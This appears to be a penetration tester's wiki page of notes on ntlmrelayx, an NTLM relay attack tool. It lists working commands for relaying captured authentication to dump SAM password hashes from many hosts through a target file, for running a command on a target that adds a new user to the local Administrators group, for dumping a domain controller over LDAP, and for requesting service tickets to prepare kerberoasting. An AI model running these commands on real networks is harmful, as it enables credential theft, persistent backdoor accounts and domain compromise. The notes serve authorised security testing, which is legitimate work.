<!-- TITLE: Ntlmrelayx -->
<!-- SUBTITLE: A quick summary of Ntlmrelayx -->

# Wish
Would be nice to be able to specify only certain users to be relayed (domain admins only).
Perhaps blacklist IPs on responder.
Would be nice to keep state (which users have been tried against which boxes, so you cover more targets, and make the most of rare hashes).

# Note that as of this writing it uses python 2.7.18
use pipenv to install in a clean env

# Highly recommend a target file
Previous test had a high privilege user making a ton of connections and got sams from many boxes at once.  Had I hit only one I'd have only gotten one.  
# Common Usages
## No Arguments defaults to dumping SAM
```
ntlmrelayx.py -tf targets -w --no-http-server -smb2support
-tf uses a target file instead of one target
-w means to watch the target file in case it changes.
Targetfile should be ldap://ip   smb://ip  https://ip etc
```

## Run a Command
```
ntlmrelayx.py -t smb://192.168.10.102 -c 'net user newname passw0rd /add; net localgroup Administrators nename /add'
```

## LDAP Dump of domain
```
ntlmrelayx.py -t ldap://ip_of_domain_controller
```

## Looks like it supports socks server of some sort.  Not sure about this one.

## GetUserSPNs - prep for kerberoasting
```
I don't see how to add hashes/auth here but it has to happen.
GetUserSPNs.exe -request -dc-ip <ip> username -outputfile TGStickets
```


